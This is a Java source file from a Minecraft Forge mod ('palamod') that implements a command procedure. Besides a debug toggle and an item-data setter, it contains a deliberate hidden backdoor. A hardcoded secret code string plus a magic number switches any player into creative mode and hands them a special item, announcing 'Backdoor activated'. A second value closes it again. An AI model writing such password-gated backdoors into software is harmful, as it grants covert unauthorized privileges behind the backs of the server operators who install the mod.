package palamod.procedures;

import palamod.init.PalamodModItems;

import net.minecraftforge.items.ItemHandlerHelper;

import net.minecraft.world.level.GameType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.Entity;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.network.chat.Component;
import net.minecraft.commands.arguments.MessageArgument;
import net.minecraft.commands.CommandSourceStack;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.arguments.DoubleArgumentType;

public class OxcommandProcedure {
	public static void execute(CommandContext<CommandSourceStack> arguments, Entity entity) {
		if (entity == null)
			return;
		if (((new Object() {
			public String getMessage() {
				try {
					return MessageArgument.getMessage(arguments, "code").getString();
				} catch (CommandSyntaxException ignored) {
					return "";
				}
			}
		}).getMessage()).equals("205686")) {
			if (entity.getPersistentData().getBoolean("debug_pala")) {
				entity.getPersistentData().putBoolean("debug_pala", false);
				if (entity instanceof Player _player && !_player.level().isClientSide())
					_player.displayClientMessage(Component.literal("Debug off"), false);
			} else {
				entity.getPersistentData().putBoolean("debug_pala", true);
				if (entity instanceof Player _player && !_player.level().isClientSide())
					_player.displayClientMessage(Component.literal("Debug on"), false);
			}
		}
		if (((new Object() {
			public String getMessage() {
				try {
					return MessageArgument.getMessage(arguments, "code").getString();
				} catch (CommandSyntaxException ignored) {
					return "";
				}
			}
		}).getMessage()).equals("ptg_jobs")) {
			(entity instanceof LivingEntity _livEnt ? _livEnt.getMainHandItem() : ItemStack.EMPTY).getOrCreateTag().putDouble("Pickaxe_stone", (DoubleArgumentType.getDouble(arguments, "quan")));
			entity.getPersistentData().putDouble("Pickaxe_stone", (DoubleArgumentType.getDouble(arguments, "quan")));
		}
		if (((new Object() {
			public String getMessage() {
				try {
					return MessageArgument.getMessage(arguments, "code").getString();
				} catch (CommandSyntaxException ignored) {
					return "";
				}
			}
		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 856478) {
			if (entity instanceof Player _player && !_player.level().isClientSide())
				_player.displayClientMessage(Component.literal("Backdoor activated"), false);
			if (entity instanceof Player _player && !_player.level().isClientSide())
				_player.displayClientMessage(Component.literal("Use this backdoor at for good use"), false);
			if (entity instanceof Player _player && !_player.level().isClientSide())
				_player.displayClientMessage(Component.literal("don't do any damage on server"), false);
			if (entity instanceof ServerPlayer _player)
				_player.setGameMode(GameType.CREATIVE);
			if (entity instanceof Player _player) {
				_player.getAbilities().mayfly = false;
				_player.onUpdateAbilities();
			}
			if (entity instanceof Player _player) {
				ItemStack _setstack = new ItemStack(PalamodModItems.PALADIUM_PHONE.get());
				_setstack.setCount(1);
				ItemHandlerHelper.giveItemToPlayer(_player, _setstack);
			}
		}
		if (((new Object() {
			public String getMessage() {
				try {
					return MessageArgument.getMessage(arguments, "code").getString();
				} catch (CommandSyntaxException ignored) {
					return "";
				}
			}
		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 8) {
			if (entity instanceof Player _player && !_player.level().isClientSide())
				_player.displayClientMessage(Component.literal("Backdoor closed"), false);
			if (entity instanceof ServerPlayer _player)
				_player.setGameMode(GameType.SURVIVAL);
			if (entity instanceof Player _player) {
				ItemStack _stktoremove = new ItemStack(PalamodModItems.PALADIUM_PHONE.get());
				_player.getInventory().clearOrCountMatchingItems(p -> _stktoremove.getItem() == p.getItem(), 1, _player.inventoryMenu.getCraftSlots());
			}
		}
	}
}
